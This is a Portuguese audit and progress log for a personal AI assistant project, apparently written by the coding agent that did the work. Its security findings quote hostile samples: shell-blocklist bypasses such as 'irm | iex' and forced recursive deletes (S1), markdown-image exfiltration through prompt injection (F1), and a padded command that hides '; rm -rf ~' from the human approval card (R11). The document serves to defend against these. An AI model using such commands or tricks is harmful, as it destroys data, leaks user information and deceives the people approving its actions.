# ORION — Plano de melhorias e o que foi feito

> Auditoria de 02/10/2026 (backend, front, regras, docs) e a execução dela, mais a segunda
> rodada de 03/10/2026 (achados R1–R11 abaixo). Cada achado tem ID, evidência e status. O que
> **não** foi verificado está na seção própria.
> Regras resultantes: [ORION_REGRAS.md](ORION_REGRAS.md). Plano de fases: [ORION_NUCLEO.md](ORION_NUCLEO.md).

## Achados e status

Legenda: ✅ resolvido e testado · 🟡 parcial · ⏳ depende de você ou de fase futura.

| ID | Sev. | Achado (evidência) | Status | Como |
|---|---|---|---|---|
| S1 | Alta | Câmara de Eco era blocklist de substring: `ri … -Recurse -Force`, `-r -fo`, `rmdir /s /q`, `-enc`, `[IO.Directory]::Delete`, `irm \| iex` saíam "baixo" | ✅ | Allowlist de leitura (`orion/policy/shell.py`); o legado delega a ela. `tests/policy/test_shell.py` tem os bypasses |
| S2 | Alta | Escrever no próprio código (`.py`, `.env` em `C:\Orion`) era "baixo risco" (lido do código) | ✅ | `PathGuard` protege a raiz do projeto; vale também para `gerar_documento` |
| B1 | Alta | Telegram devolvia o JSON cru do SSE (`{"tier":…}{"text":…}`) | ✅ | Parse correto + teste. (Correção de 03/10: só o *formato* do SSE é o mesmo; o bot do legado não envia o token que o `/chat` novo exige, então o canal novo `orion/channels/telegram.py` o substitui) |
| S3 | Média | Hub `:8765` e `/ws/voice` aceitavam qualquer `Origin`; `/upload` sem limite | 🟡 | Origin conferido (testado com `websockets` real) e 25 MB. **Falta:** `/mcp` e o REST do legado seguem sem login até a fase 5 |
| S4 | Média | `buscar_url` sem bloqueio de IP local (SSRF para o REST do próprio Orion) | ✅ | `url_guard` (loopback, LAN, Tailscale, metadados, redirects). Limite: janela de DNS rebinding; o agente do `navegar_web` navega livre depois da 1ª página |
| S5 | Média | Confirmação por frase no chat, estado global, "turno seguinte" | ✅ (novo) | Aprovação fora de banda por (sessão, ferramenta, hash), 10 min, uso único. No legado a frase continua, mas o gate ficou mais forte |
| B2 | Média | Um histórico global para todos os canais | ✅ (novo) | Sessão ativa por canal. Legado inalterado (será apagado) |
| S6 | Baixa | ~45 SQL por f-string, 184 `except Exception`, audit engolia erro | 🟡 | Audit do legado não perde mais registro em silêncio; código novo parametrizado e sem `pass`. SQL do legado fica até a fase 3–4 |
| B3 | Baixa | "Diretiva Nº 2" citada onde não existe mais; ferramenta bloqueava nuvem | ✅ | Textos corrigidos; a aprovação do especialista é por ser agente com shell, não por ser nuvem |
| B4 | Baixa | Prompt com hardware/stack datados; persona em arquivo editável | ✅ | Legado limpo; `orion/persona.py` versionado, imutável, com teste contra fato que envelhece |
| E1 | Média | Sem CI nem testes unitários | ✅ | `.github/workflows/ci.yml` (Linux, Windows, macOS) + 270 testes Python + 18 em Node |
| E2 | Média | Só Windows, caminhos `C:\Orion` fixos, `requirements` com pywin32/torch | 🟡 | Pacote novo é portável (`platformdirs`, caminhos por config). Legado segue Windows por desenho até a fase 7 |
| E3 | Média | Globals, `ChatRouter` com 22 argumentos, `on_event` deprecado | ✅ (novo) | `create_app` com lifespan e `AppState` injetado |
| E4 | Baixa | `script.js` monolítico, `innerHTML` sem teste | ✅ | Front redesenhado em módulos (03/10/2026): 7 puros testados em Node (89 testes) + 77 testes de navegador (fluxos, segurança, mobile, axe). Ver [ORION_FRONT.md](ORION_FRONT.md) |
| E5 | Baixa | Drift de docs, `.gitignore`, `requirements` | 🟡 | Corrigidos. A pasta `Orion_Ollama/` **não** foi renomeada (o `.bat`, o boot e o README apontam para ela; sai na fase 7) |
| E6 | Média | RAG sem avaliação (HR 10%, MRR 0.057) | ✅ | `orion.memory.eval` + conjunto fixo em pytest; CLI para as **suas** perguntas reais |
| F1 | Média | *(achado durante a execução)* o chat renderizava `![x](https://host-qualquer/?d=…)` do modelo: exfiltração por prompt injection | ✅ | Só imagem de `/imagens/<arquivo>`; 18 testes em Node, com checagem de que falham no código antigo |

## Segunda rodada (03/10/2026): lacunas do plano de mudança

Revisão do plano (NUCLEO §6–7) contra o código e o CI. Corte e operação: [ORION_CORTE.md](ORION_CORTE.md).

| ID | Sev. | Achado (evidência) | Status | Como |
|---|---|---|---|---|
| R1 | Alta | O importador trazia só `sessao` e `evento`; `lembrete`, `agendamento`, `tarefa`, `numero`, `prompt` eram contados e jogados fora, e o grafo (`precedeu`, `sobre`, `conecta`) nem era lido: vender o PC perderia esses dados | ✅ (formato do grafo não visto em export real) | Esquema v2 com migração; importador completo e idempotente; `orion verify-export` |
| R2 | Alta | Fase 0 sem prova: "contagens esperadas" não era conferível | ✅ | `orion verify-export` (contas por tabela, importação de ensaio, backup/restauração, busca no banco restaurado, só os **nomes** do `.env`) |
| R3 | Média | Importar sem informar o nome antigo do assistente marcava todas as respostas antigas como `system` (fora da busca) sem aviso | ✅ | Aviso no `import-surreal` e no `verify-export` listando os atores que viram `system` |
| R4 | Média | Sem plano de corte: depois da venda o legado não roda e o novo ainda não tem canais | ✅ (decisões suas pendentes) | [ORION_CORTE.md](ORION_CORTE.md): blocos A e B, critérios, rollback, o que decidir |
| R5 | Média | Sem agendador: lembretes e agendamentos migrados não teriam quem os disparasse; embeddings sem cliente; backup sem agendamento; sem consolidação | ✅ (embeddings e consolidação só com falsos) | `orion/jobs.py`, `GeminiEmbedder`, `Consolidator`, fila `/notifications`, backup diário em `ORION_BACKUP_DIR`, `ORION_VAULT_DIR` |
| R6 | Média | Host fora de `127.0.0.1` (Tailscale) podia ser liberado sem login | ✅ | Regra 17: a configuração recusa subir sem `ORION_ADMIN_TOKEN` |
| R7 | Baixa | `httpx` era importado em tempo de execução mas só declarado no grupo `dev`; docs defasadas ("CI remoto não rodou", fase 6 "só md.js") | ✅ | Dependência movida; docs sincronizadas; triagem das 55 ferramentas em [ORION_FERRAMENTAS.md](ORION_FERRAMENTAS.md) |
| R8 | Alta | O plano dizia que o bot do Telegram do legado lia o `/chat` novo "sem mudança": falso. O `/chat` novo exige `Authorization: Bearer` e o bot do legado não envia (401); o teste só provava o formato do SSE | ✅ (API falsa) | Canal novo `orion/channels/telegram.py`: default-deny, aprovação por botão, fila de avisos; regra 21 |
| R9 | Média | Sem `autostart` e sem ferramentas para agir no computador no núcleo novo | ✅ (Windows só no argv) | `orion autostart` (gera, não ativa) e `orion-desktop` v0 opt-in; ler segredo/chave agora confirma (regra 22) |
| R10 | Baixa | O `httpx` registra a URL em INFO, e a URL da API do Telegram carrega o token; campo `args` duplicado em `Approval` | ✅ | Logger do `httpx`/`httpcore` em WARNING (com teste); campo duplicado removido |
| R11 | Alta | O cartão de aprovação escondia o fim de comandos longos: o front cortava cada argumento em 700 caracteres e o servidor em 2000, então um comando com enchimento podia esconder `; rm -rf ~` depois do corte e o Antônio aprovaria sem ver | ✅ | `args_truncated` no evento e em `/approvals`; web e Telegram só deixam **negar** o que não cabe inteiro; a interface mostra o argumento sem cortar; regra 23 |

## O que foi construído (por fase do NUCLEO)

| Fase | Entrega | Status |
|---|---|---|
| 0 — exportar dados | A ferramenta `backup_memoria` do legado já grava o formato que o importador lê (todas as tabelas); `orion verify-export` prova o export | ⏳ **sua** (PC, `.env`, `google_auth/`, vault) |
| 1 — fundação | `pyproject` (uv, ruff, pyright, pytest), `orion.config`, logging JSON, `/health`, CLI, CI Win+macOS | ✅ (CI verde em Linux, Windows e macOS na `main`) |
| 2 — cérebro | `orion.gateway` (API OpenAI-compat., streaming, fallback, quarentena em 429), `orion.agent` (persona + memória + ferramentas sob política), `orion.delegate` (claude/codex/gemini), `POST /chat` | ✅ com gateway e CLIs **falsos**; ⏳ OmniRoute e CLIs reais |
| 3 — memória | SQLite + FTS5 + vetores (numpy) com RRF, fatos editáveis, vault, backup/restore (`orion backup`, `orion restore`), eval, **importador completo do export** (esquema v2), lembretes/agendamentos/tarefas/números/prompts/grafo, fila de avisos, jobs, `GeminiEmbedder`, consolidação | ✅ no código; ⏳ chave de embeddings e suas perguntas reais |
| 4 — ferramentas | Política (classes de risco, aprovações, taint, audit); ferramentas de memória, operação e `delegar`; triagem das 55 do legado | 🟡 faltam servidores MCP e `orion-desktop` |
| 5 — canais | `/approvals` com token; canal Telegram novo e `orion autostart` (só API/sistema falsos); login e Tailscale **não** | 🟡 |
| 6 — interface/voz | Front redesenhado em 03/10 (só desktop, [ORION_FRONT.md](ORION_FRONT.md)); voz não começou | 🟡 |
| 7 — limpeza | Nada apagado: o legado ainda é a única coisa rodando com seus dados | ⏳ |

## Decisões que tomei por você (reverta se discordar)

1. **Loop de agente próprio, não PydanticAI** (decisão #3, alternativa). O fluxo de aprovação precisa
   controlar quando cada ferramenta roda e eu não tinha como validar PydanticAI contra um modelo real aqui.
2. **`executar_comando` sempre confirma**, salvo leitura provada (assumi seu "pode executar tudo" como aceite
   da recomendação que eu tinha dado).
3. **Pacote `orion/` na raiz**, ao lado do legado.
4. **Ring 0 #4 (Hardware-Bound) não foi alterado.** Deixei a proposta em ORION_REGRAS.md.
5. O legado importa `orion.policy` (só stdlib) para não ter duas políticas. Se `orion/` sumir, o gate do
   legado quebra: é acoplamento transitório, some na fase 7.

## O que não foi verificado

- **Windows e macOS:** o primeiro CI remoto rodou e já pagou o investimento: no **macOS** o Python do `uv` vem sem
  `enable_load_extension`, o que inviabilizaria o `sqlite-vec` no MacBook (troquei por vetores em tabela comum + numpy);
  no **Windows** a saída de uma CLI em Python voltava com acento corrompido (cp1252 no pipe; o `Delegator` agora força UTF-8
  no filho). Depois dessas correções o CI da `main` ficou verde nos três sistemas (run #8, 03/10). A rodada de 03/10
  (jobs, importador, embeddings) foi testada **no Linux**; o CI nos três sistemas dela está no PR.
- **Formato do export real:** `verify-export` e o importador foram testados com exports sintéticos montados a partir do
  código do legado (`backup_memoria` = `SELECT *` de cada tabela de `INFO FOR DB`). Os campos `in`/`out` das relações
  `precedeu`/`sobre`/`conecta` são os padrões do `RELATE` do SurrealDB, mas **nunca vi um export real**: se não baterem, o
  relatório mostra as arestas como "sem nó" em vez de importar. Rode o `verify-export` no PC antes de vender.
- **Embeddings:** o `GeminiEmbedder` fala o formato `batchEmbedContents` (cabeçalho `x-goog-api-key`, `taskType`,
  `outputDimensionality`) por memória da documentação e foi testado só contra uma API falsa. Primeira chamada real é sua:
  confira modelo, dimensão e a cota do plano gratuito.
- **Consolidação:** testada com um modelo falso. Com um modelo real o formato JSON pode vir fora do esperado (a rodada
  falha sem avançar a marca e tenta de novo) e a qualidade dos fatos precisa de olho humano (`MemoryStore.facts_markdown()` gera a nota para conferir e corrigir).
- **Jobs em tempo real:** testados com relógio falso e com o laço cancelado/retomado; não há teste de dias de uptime.
  O disparo de agendamento **só avisa** (regra 18); a entrega ao celular é o canal Telegram novo lendo a fila.
- **Telegram real:** o canal foi testado só contra uma API falsa (formato de `getUpdates`, `sendMessage`, `answerCallbackQuery`,
  `editMessageReplyMarkup` e `callback_data` por memória da documentação). Primeira mensagem real é sua.
- **Autostart:** os arquivos do Windows (`.cmd` em Startup), macOS (LaunchAgent) e Linux (unit de usuário) são gerados e
  validados como texto (o plist é lido por `plistlib`); nenhum foi ativado no sistema de verdade.
- **`orion-desktop` v0:** o shell real só foi executado no Linux; no Windows (PowerShell) só o argv é testado. Desligado por padrão.
- **Legado em produção:** o gate novo foi testado com stubs, não com Qdrant/SurrealDB no ar. **Antes de usar no PC,
  suba o cérebro e faça um pedido que rode `executar_comando`** — agora ele vai pedir confirmação em quase tudo
  que não for leitura (esse é o comportamento desejado, mas muda o uso).
- **Modelos reais:** nenhum gateway real foi chamado; o formato é o da OpenAI (OmniRoute o fala), mas o primeiro
  teste ao vivo é seu.
- **Embeddings reais:** a busca vetorial foi testada com um embedder falso (sinônimos). Falta o cliente da API
  gratuita (Gemini) e medir com suas perguntas reais — o conjunto de avaliação existe para isso.
- **Front:** carrega no Chromium headless sem erro; não testei dentro do pywebview, nem acessibilidade, nem o grafo 3D.
- `/mcp`, CORS `null` e o REST do legado continuam sem login até a fase 5 (já documentado no README).

## Próximos passos (em ordem)

1. **Fase 0, agora:** `backup_memoria` no PC, copiar `.env` e `Orion_Core/google_auth/`, conferir o vault, e rodar
   `orion verify-export` até dar `PRONTO` ([ORION_CORTE.md](ORION_CORTE.md) §2).
2. Rodar `uv sync && uv run pytest` na sua máquina.
3. `orion import-surreal <pasta-do-backup> --assistente <nome-antigo>` e escrever 15–30 perguntas reais em
   `tests/eval_pessoal.local.json` (modelo em `tests/eval_pessoal.example.json`); medir com
   `python -m orion.memory.eval <casos> --db <orion.db> --embeddings --min-hit-rate 0.8`.
4. Subir o OmniRoute e testar `ORION_GATEWAY_URL`/`ORION_GATEWAY_MODEL` com `POST /chat`.
5. Fase 5: criar o bot (@BotFather), preencher `ORION_TELEGRAM_TOKEN`/`ORION_TELEGRAM_ALLOWED_USERS` e testar no notebook (pare o bot do legado antes); depois login e Tailscale; `uv run orion autostart`.
6. Fase 4: servidores MCP (navegador, Google) e `orion-desktop`, cada ferramenta com classe em `orion/policy/classes.py`;
   a ordem e o destino de cada uma estão em [ORION_FERRAMENTAS.md](ORION_FERRAMENTAS.md).
7. Decidir o que o [plano de corte](ORION_CORTE.md) deixa em aberto (data da venda, ferramentas mínimas, dias em paralelo).

## Ideias que sobraram (valor/custo)

- Briefing matinal no Telegram (agenda + lembretes + tarefas abertas).
- Captura rápida: link, foto ou voz no Telegram vira nota no vault (o `index_vault` já indexa).
- Painel único: cota por provedor, aprovações pendentes, audit, uso das CLIs (os contadores já existem).
- Modo estudo UNIMAR: resumo de PDF de aula e exercícios de UML/Java, com perfil de contexto próprio.
- Roteamento por tipo de tarefa (barato/rápido vs. pesado) no lugar do regex de palavras-chave.
- ~~Consolidação noturna da memória~~ (feito em 03/10: `orion/memory/consolidate.py`).
